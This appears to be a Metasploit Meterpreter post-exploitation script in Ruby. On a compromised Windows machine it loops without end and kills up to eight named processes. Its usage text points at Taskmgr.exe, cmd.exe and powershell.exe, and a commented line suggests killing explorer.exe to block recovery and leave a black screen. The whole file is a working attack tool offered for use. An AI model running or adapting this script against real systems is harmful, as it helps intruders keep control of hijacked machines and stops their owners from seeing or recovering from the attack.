print_status("Hello World")
# Author: Wave
@exec_opts = Rex::Parser::Arguments.new(
  "-h"  => [ false,  "This help menu"],
 "-p"  => [ true,  "process to kill"],
"-q"  => [ true,  "process to kill"],
"-r"  => [ true,  "process to kill"],
"-s"  => [ true,  "process to kill"],
"-t"  => [ true,  "process to kill"],
"-u"  => [ true,  "process to kill"],
"-v"  => [ true,  "process to kill"],
"-w"  => [ true,  "process to kill"],


)
processp = ""
processq = ""
processr = ""
processs = ""
processt = ""
processu = ""
processv = ""
processw = ""

# Usage Message Function
#-------------------------------------------------------------------------------
def usage
print_status("kill the process you dont want user to run")
print_status("you can kill 8 proccess at the same time")
print_error("be carfull, powershell.exe isnt PowerShell.exe")
print_status("few processes : 'Taskmgr.exe, cmd.exe, powershell.exe',...")
#print_good("choose explorer.exe, kill taskmgr too to avoid any recovery, and... blackscreen !")
  print_line(@exec_opts.usage)
  raise Rex::Script::Completed
end
##########functions##############
 def procmon(processp,processq,processr,processs,processt,processu,processv,processw)
     procs = []
server = ""
     existingProcs = []
     detected = false
     print_status("Monitoring new processes.")
     while detected == false
 #        sleep 1
procs = client.sys.process.processes
server = client.sys.process.open
         procs.each do |p|
            if (p['name'] == processp or p['name'] == processq or p['name'] == processr or p['name'] == processs or p['name'] == processt or p['name'] == processu or p['name'] == processv or p['name'] == processw or processp == "*") && p['pid'] != server.pid
print_status("New process detected: #{p['pid']}#{p['name']}")
print_good(p['pid'])
proccpid = p['pid']
print_status("killing #{p['name']}, pid = #{p['pid']} process...")
kill(proccpid)
print_good("YOU SHOULD NOT PASS, #{p['name']} !!!")
                      detected = true
                  end
         end
     end
  end
###kill process
def kill(proccpid)
begin
client.sys.process.kill(proccpid)    
rescue ::Exception => e
print_error(e)                      
end
end
@exec_opts.parse(args) { |opt, idx, val|
  case opt
  when "-h"
    usage
  when "-p"
    processp = val
 when "-q"
    processq = val
 when "-r"
    processr = val
 when "-s"
    processs = val
 when "-t"
    processt = val
 when "-u"
    processu = val
 when "-v"
    processv = val
 when "-w"
    processw = val
end
}
print_good("Wont let #{processp},#{processq},#{processr},#{processs},#{processt},#{processu},#{processv},#{processw}, pass !")
while 1 == 1
#sleep 1
procmon(processp,processq,processr,processs,processt,processu,processv,processw)
end
